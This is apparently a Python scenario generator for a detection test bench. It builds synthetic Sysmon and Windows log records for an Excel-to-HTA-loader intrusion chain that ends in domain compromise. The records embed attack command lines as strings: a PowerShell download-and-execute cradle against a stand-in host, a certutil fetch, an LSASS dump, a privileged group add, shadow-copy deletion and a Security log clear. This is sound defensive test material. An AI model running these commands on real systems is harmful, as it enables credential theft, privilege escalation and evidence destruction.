"""storyline_excel_loader_domain_abuse -- a malicious Excel workbook starts an HTA loader, the loader's
PowerShell reads LSASS, writes a shadow-credential attribute on the domain controller, adds the stolen
account to a privileged group and clears the Security log. The workstation side is a SPAWN CHAIN: every
alert-raising process is created by the previous stage's alert-raising process.

Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).

    loader_shell -> {ps_encoded, tool_download}
                    ps_encoded -> {lsass_read, service_persistence, stage2_shell}
                                   stage2_shell -> {shadow_delete, sched_task, log_clear}
    (plus ps_cradle (4104), directory_tamper (5136) and group_escalation (4728): alerts from Windows logs)

WHY IT EXISTS (ADR-011 n gap, ADR-012 WP 7). Same purpose as ``storyline_endpoint_macro_c2``, with a
different shape: a script-host root (mshta) with TWO alerting children, a second-stage PowerShell that is both
a child and a parent, two steps whose alerts come from the DOMAIN CONTROLLER's own log (different ``Computer``
and ``meta.shipper_ip`` than the workstation; no parent key, so never link endpoints) and no beacon burst.
The builder marks each step's alert-raising record (``trigger=True``); the oracle's ``causal_links`` are
derived from the raw records by ``sysmon_tree.derive_links`` (B's trigger EID 1 has ParentProcessGuid == A's
trigger ProcessGuid; nothing else is graded).

PROCESS TREE (workstation ``W``; the DC emits only Windows Security records; ``[rule]`` = a step's trigger)

    explorer -> EXCEL -> mshta (HTA loader) [office-spawn]                   (step loader_shell)
                          +--> powershell -enc [encoded-cmd] = P             (step ps_encoded)
                          |      +--> hostname / ipconfig / net / nltest      (helpers of ps_cradle)
                          |      +--> dumper --EID10--> lsass [lsass-dump]    (step lsass_read)
                          |      +--> ldifde                                  (helper of directory_tamper)
                          |      +--> net group /add                          (helper of group_escalation)
                          |      +--> sc.exe create [service]                 (step service_persistence)
                          |      +--> powershell -enc stage 2 [encoded-cmd] = Q   (step stage2_shell)
                          |             +--> vssadmin delete shadows [shadow]     (step shadow_delete)
                          |             +--> schtasks /create [schtasks]          (step sched_task)
                          |             +--> wevtutil cl Security [log-clear]     (step log_clear)
                          +--> certutil -urlcache [certutil]                  (step tool_download)

    8 trigger-to-trigger spawn links.

TELEMETRY. Real parsers: ``sysmon`` (EID 1, 10) and ``windows_eventlog`` (4104, 5136, 4728, 1102). No
dependency gaps (``parse_expected=True`` everywhere).

STRUCTURE VARIES WITH THE SEED: account, workstation and DC addresses, script-block count (1-3), the AD
attribute, the dumper name and the privileged group.

SAFETY. Simulation only: ``.invalid`` names, private 10.0.0.0/8 addresses, a fixed calendar epoch, no wall
clock; command lines are strings inside log records and nothing runs.
"""
from __future__ import annotations

import sys
from pathlib import Path
from random import Random

TWIN = Path(__file__).resolve().parent
if str(TWIN) not in sys.path:
    sys.path.insert(0, str(TWIN))

from scenario import ChainStepSpec, ScenarioDef  # noqa: E402
from scenario_kit import BASE_MS  # noqa: E402
from sysmon_tree import Emitter, Host  # noqa: E402

TAG = "eld"

STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("loader_shell", "sysmon", True,
                  "Excel's macro starts an HTA loader (a document host spawns a script host)"),
    ChainStepSpec("ps_encoded", "sysmon", True,
                  "the loader starts a PowerShell with an encoded command"),
    ChainStepSpec("tool_download", "sysmon", True,
                  "the loader fetches the next-stage tool with certutil"),
    ChainStepSpec("ps_cradle", "windows_eventlog", True,
                  "that PowerShell's script block is a download-and-execute cradle"),
    ChainStepSpec("lsass_read", "sysmon", True,
                  "a dumper started by that PowerShell opens lsass.exe with a memory-read mask"),
    ChainStepSpec("directory_tamper", "windows_eventlog", True,
                  "the stolen account writes a shadow-credential attribute on the domain controller"),
    ChainStepSpec("group_escalation", "windows_eventlog", True,
                  "the stolen account is added to a privileged global group"),
    ChainStepSpec("service_persistence", "sysmon", True,
                  "a service is created for the dropped tool (sc.exe create)"),
    ChainStepSpec("stage2_shell", "sysmon", True,
                  "the first PowerShell starts a second-stage PowerShell with an encoded command"),
    ChainStepSpec("shadow_delete", "sysmon", True,
                  "the second stage deletes the volume shadow copies"),
    ChainStepSpec("sched_task", "sysmon", True,
                  "the second stage registers a scheduled task"),
    ChainStepSpec("log_clear", "sysmon", True,
                  "the second stage clears the workstation's Security event log (wevtutil cl, then Event 1102)"),
)
DECOY_STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("decoy_group_change", "windows_eventlog", True,
                  "a helpdesk administrator adds a user to a local group on a file server (BENIGN)"),
)

_ACCOUNTS = ("r.treasury", "j.audit", "p.hr", "c.billing")
_WKS = ("wks-tre-04", "wks-aud-17", "wks-hr-19", "wks-bil-02")
_DUMPERS = ("rdrleakdiag.exe", "mdmp64.exe", "tasklist-x.exe")
_ATTRS = ("msDS-KeyCredentialLink", "servicePrincipalName", "msDS-AllowedToDelegateTo")
_GROUPS = ("Domain Admins", "Backup Operators", "Account Operators")
_CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://stage.example.invalid/l.ps1')"
_ENC1 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
_ENC2 = "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA=="
_PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
_SYS = "C:\\Windows\\System32\\"
_PS = _SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
_OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"


def build(seed: int):
    rng = Random(seed * 1299743 + 53)
    user = rng.choice(_ACCOUNTS)
    wks_name = rng.choice(_WKS)
    wks_ip = f"10.43.{rng.randint(1, 9)}.{rng.randint(20, 200)}"
    dc_ip = f"10.43.0.{rng.randint(2, 9)}"
    dumper = rng.choice(_DUMPERS)
    attr = rng.choice(_ATTRS)
    group = rng.choice(_GROUPS)
    n_ps = 1 + seed % 3
    svc_name = f"WinUpd{rng.randint(10, 99)}"
    tool_path = f"C:\\Users\\Public\\{svc_name.lower()}.exe"

    wks = Host(wks_name, wks_ip, seed)
    em = Emitter(seed, TAG, STEPS)
    notes: dict = {}
    t0 = BASE_MS

    def add(label: str, source_type: str, raw: dict, ts: int, ip: str = wks_ip, trigger: bool = False) -> None:
        em.add(label, source_type, raw, ts, ip, trigger=trigger)

    def spawn(label: str, p, trigger: bool = True) -> None:
        add(label, "sysmon", p.create_record(), p.start_ms, trigger=trigger)

    explorer = wks.proc("C:\\Windows\\explorer.exe", "explorer.exe", user, t0 - 1_000)
    excel = wks.proc(_OFFICE + "EXCEL.EXE", "\"EXCEL.EXE\" C:\\Users\\Public\\Q3-forecast.xlsm", user, t0 + 2_000, explorer)
    mshta = wks.proc(_SYS + "mshta.exe", "mshta.exe http://stage.example.invalid/l.hta", user, t0 + 8_000, excel)
    ps = wks.proc(_PS, f"powershell.exe -nop -w hidden -enc {_ENC1}", user, t0 + 14_000, mshta)
    certutil = wks.proc(_SYS + "certutil.exe",
                        f"certutil.exe -urlcache -split -f http://stage.example.invalid/{svc_name.lower()}.exe {tool_path}",
                        user, t0 + 20_000, mshta)
    recon = [wks.proc(_SYS + exe, cmd, user, t0 + 22_000 + i * 2_000, ps) for i, (exe, cmd) in enumerate((
        ("hostname.exe", "hostname"), ("ipconfig.exe", "ipconfig /all"),
        ("net.exe", "net user /domain"), ("nltest.exe", "nltest /dclist:corp.example")))]
    t_ps = t0 + 40_000
    drop = wks.proc(f"C:\\Users\\Public\\{dumper}", f"{dumper} -ma lsass.exe", user, t0 + 70_000, ps)
    lsass = wks.proc(_SYS + "lsass.exe", "lsass.exe", "SYSTEM", t0 - 7_200_000)
    ldif = wks.proc(_SYS + "ldifde.exe", f"ldifde.exe -i -f C:\\Users\\Public\\{attr}.ldf", user, t0 + 110_000, ps)
    netg = wks.proc(_SYS + "net.exe", f"net.exe group \"{group}\" {user} /add /domain", user, t0 + 170_000, ps)
    sc = wks.proc(_SYS + "sc.exe", f"sc.exe create {svc_name} binPath= {tool_path}", user, t0 + 230_000, ps)
    stage2 = wks.proc(_PS, f"powershell.exe -nop -w hidden -enc {_ENC2}", user, t0 + 300_000, ps)
    vss = wks.proc(_SYS + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", user, t0 + 320_000, stage2)
    schtask = wks.proc(_SYS + "schtasks.exe",
                       f"schtasks.exe /create /tn {svc_name} /tr {tool_path} /sc daily", user, t0 + 340_000, stage2)
    wevt = wks.proc(_SYS + "wevtutil.exe", "wevtutil.exe cl Security", user, t0 + 360_000, stage2)

    for p in (explorer, excel):
        spawn("loader_shell", p, trigger=False)
    spawn("loader_shell", mshta)
    notes["loader_shell"] = f"{user} on {wks_name}: EXCEL -> mshta.exe"

    spawn("ps_encoded", ps)
    notes["ps_encoded"] = f"mshta.exe starts powershell.exe -enc on {wks_name}"

    spawn("tool_download", certutil)
    notes["tool_download"] = f"certutil -urlcache fetches {svc_name.lower()}.exe"

    for p in recon:
        spawn("ps_cradle", p, trigger=False)
    for i in range(n_ps):
        ts = t_ps + i * 10_000
        add("ps_cradle", "windows_eventlog",
            {"EventID": 4104, "Channel": _PS_CHANNEL, "ProviderName": "Microsoft-Windows-PowerShell",
             "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "ScriptBlockText": _CRADLE, "TimeCreated": ts}, ts)
    notes["ps_cradle"] = f"{n_ps} script-block event(s) on {wks_name}; 4 recon children of the PowerShell"

    spawn("lsass_read", drop)
    t_acc = drop.start_ms + 5_000
    add("lsass_read", "sysmon", drop.access_record(t_acc, lsass.image, lsass.guid, lsass.pid, "0x1010"), t_acc)
    notes["lsass_read"] = f"{dumper} opens lsass.exe with GrantedAccess 0x1010"

    spawn("directory_tamper", ldif, trigger=False)
    t_dir = ldif.start_ms + 4_000
    add("directory_tamper", "windows_eventlog",
        {"EventID": 5136, "Computer": "dc01", "SubjectUserName": user, "SubjectDomainName": "CORP",
         "ObjectDN": "CN=svc-sql,OU=Services,DC=corp,DC=example", "ObjectClass": "user",
         "AttributeLDAPDisplayName": attr, "AttributeValue": "MSSQLSvc/db01.corp.example:1433",
         "OperationType": "%%14674", "TimeCreated": t_dir}, t_dir, dc_ip)
    notes["directory_tamper"] = f"{user} writes {attr} on CN=svc-sql via dc01"

    spawn("group_escalation", netg, trigger=False)
    t_grp = netg.start_ms + 4_000
    add("group_escalation", "windows_eventlog",
        {"EventID": 4728, "Computer": "dc01", "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TargetUserName": user, "TargetDomainName": "CORP", "MemberName": group,
         "TimeCreated": t_grp}, t_grp, dc_ip)
    notes["group_escalation"] = f"{user} added to {group}"

    spawn("service_persistence", sc)
    notes["service_persistence"] = f"sc.exe create {svc_name} -> {tool_path} on {wks_name}"

    spawn("stage2_shell", stage2)
    notes["stage2_shell"] = f"second-stage powershell.exe -enc on {wks_name}"
    spawn("shadow_delete", vss)
    notes["shadow_delete"] = "vssadmin delete shadows /all /quiet"
    spawn("sched_task", schtask)
    notes["sched_task"] = f"schtasks /create {svc_name} -> {tool_path} daily"

    spawn("log_clear", wevt)
    t_clr = wevt.start_ms + 3_000
    add("log_clear", "windows_eventlog",
        {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
         "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TimeCreated": t_clr}, t_clr)
    notes["log_clear"] = f"{user} clears the Security log on {wks_name}"
    return em.payloads, {}, notes, None


def _build_decoys(seed: int) -> list:
    spec = DECOY_STEPS[0]
    em = Emitter(seed, TAG + "d", DECOY_STEPS)
    ts = BASE_MS + 45_000
    em.add(spec.label, "windows_eventlog",
           {"EventID": 4732, "Computer": "fs02", "SubjectUserName": "helpdesk.adm", "SubjectDomainName": "CORP",
            "TargetUserName": "Remote Desktop Users", "TargetDomainName": "FS02", "MemberName": "n.newhire",
            "TimeCreated": ts}, ts, "10.44.0.8")
    return em.payloads


STORYLINE = ScenarioDef(
    name="excel_loader_domain_abuse",
    steps=STEPS,
    build=build,
    oracle_path=TWIN / "oracle_excel_loader_domain_abuse.yaml",
    summary="Excel -> HTA loader -> PowerShell on one workstation as a spawn chain (Sysmon process tree): encoded "
            "command, certutil download, LSASS dump, service, a second-stage PowerShell with shadow-copy delete, "
            "scheduled task and Security log clear; shadow-credential write and privileged-group add on the DC",
    decoy=_build_decoys,
    decoy_steps=DECOY_STEPS,
)
